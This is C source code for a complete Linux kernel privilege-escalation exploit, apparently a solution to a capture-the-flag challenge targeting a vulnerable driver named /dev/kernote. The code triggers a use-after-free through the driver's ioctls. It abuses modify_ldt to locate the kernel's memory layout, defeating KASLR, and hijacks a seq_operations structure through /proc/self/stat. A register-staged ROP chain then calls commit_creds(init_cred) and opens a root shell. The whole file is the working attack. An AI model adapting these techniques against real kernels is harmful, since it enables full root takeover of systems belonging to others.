#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <asm/ldt.h>
#include <stdio.h>
#include <signal.h>
#include <pthread.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <ctype.h>


int fd;
size_t kernel_offset;
size_t kernel_base;
int seq_fd;
int ret;
size_t page_offset_base = 0xffff888000000000;
size_t init_cred;
size_t prepare_kernel_cred;
size_t commit_creds;
size_t pop_rdi_ret;
size_t swapgs_restore_regs_and_return_to_usermode;

void ErrExit(char* err_msg)
{
	puts(err_msg);
	exit(-1);
}

void set(int index)
{
    ioctl(fd, 0x6666, index);
}

void add(int index)
{
    ioctl(fd, 0x6667, index);
}

void delete(int index)
{
    ioctl(fd, 0x6668, index);
}

void edit(size_t data)
{
    ioctl(fd, 0x6669, data);
}

int main()
{
	struct user_desc desc;
	int pipe_fd[2] = {0};
	size_t temp;
	size_t *buf;
	size_t search_addr;
	
	printf("\033[34m\033[1m[*] Start exploit\033[0m\n");

	fd = open("/dev/kernote", O_RDWR);
	if(fd<0)
		ErrExit("[-] open kernote error");
	/*
	struct user_desc {
	unsigned int  entry_number;
	unsigned int  base_addr;
	unsigned int  limit;
	unsigned int  seg_32bit:1;
	unsigned int  contents:2;
	unsigned int  read_exec_only:1;
	unsigned int  limit_in_pages:1;
	unsigned int  seg_not_present:1;
	unsigned int  useable:1;
	};
	*/

	desc.entry_number = 0x8000 / 8;
	desc.base_addr = 0xff0000;
	desc.limit = 0;
	desc.seg_32bit = 0;
	desc.contents = 0;
	desc.read_exec_only = 0;
	desc.limit_in_pages = 0;
	desc.seg_not_present = 0;
	desc.useable = 0;
	desc.lm = 0;

	add(0);
	set(0);
	delete(0);
	
	syscall(SYS_modify_ldt, 1, &desc, sizeof(desc));
	while(1)
	{
		edit(page_offset_base);
		ret = syscall(SYS_modify_ldt, 0, &temp, 8);
		if(ret >= 0)
			break;
		page_offset_base+= 0x4000000;
	}
	printf("\033[32m\033[1m[+] Find page_offset_base=> \033[0m0x%lx\n", page_offset_base);
	
	pipe(pipe_fd);
	buf = (size_t*) mmap(NULL, 0x8000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
	search_addr = page_offset_base;
	while(1)
	{
		edit(search_addr);
		ret = fork();
		if(!ret)
		{
			syscall(SYS_modify_ldt, 0, buf, 0x8000);
			for(int i=0; i<0x1000; i++)
				if(buf[i]>0xffffffff81000000 && (buf[i] & 0xfff) == 0x40)
				{
					kernel_base = buf[i] - 0x40;
					kernel_offset = kernel_base - 0xffffffff81000000;
				}
			
			write(pipe_fd[1], &kernel_base, 8);
			exit(0);
		}
		
		wait(NULL);
		read(pipe_fd[0], &kernel_base, 8);
		if(kernel_base)
			break;
		search_addr+= 0x8000;
	}

	kernel_offset = kernel_base - 0xffffffff81000000;
	printf("\033[32m\033[1m[+] Find kernel base=> \033[0m0x%lx\n", kernel_base);
	printf("\033[32m\033[1m[+] Kernel offset=> \033[0m0x%lx\n", kernel_offset);

	add(1);
	set(1);
	delete(1);
	
	seq_fd = open("/proc/self/stat", O_RDONLY);
	if(seq_fd<0)
		ErrExit("[-] open seq error");
	
	edit(0xffffffff817c21a6 + kernel_offset);

	init_cred = 0xffffffff8266b780 + kernel_offset;
	prepare_kernel_cred = 0xffffffff810ca2b0 + kernel_offset;
	commit_creds = 0xffffffff810c9dd0 + kernel_offset;
	pop_rdi_ret = 0xffffffff81075c4c + kernel_offset;
	swapgs_restore_regs_and_return_to_usermode = 0xffffffff81c00fb0 + 10 + kernel_offset;

	__asm__(
	"mov r15,   0xbeefdead;"
	"mov r14,   0x11111111;"
	"mov r13,   pop_rdi_ret;" // start at there
	"mov r12,   init_cred;"
	"mov rbp,   commit_creds;"
	"mov rbx,   swapgs_restore_regs_and_return_to_usermode;"
	"mov r11,   0x66666666;"
	"mov r10,   0x77777777;"
	"mov r9,    0x88888888;"
	"mov r8,    0x99999999;"
	"xor rax,   rax;"
	"mov rcx,   0xaaaaaaaa;"
	"mov rdx,   8;"
	"mov rsi,   rsp;"
	"mov rdi,   seq_fd;"
	"syscall"
	);

	system("/bin/sh");
	return 0;
}

//sudo mount rootfs.img ./tmp
//sudo cp exp ./tmp/
//sudo umount -v ./tmp/

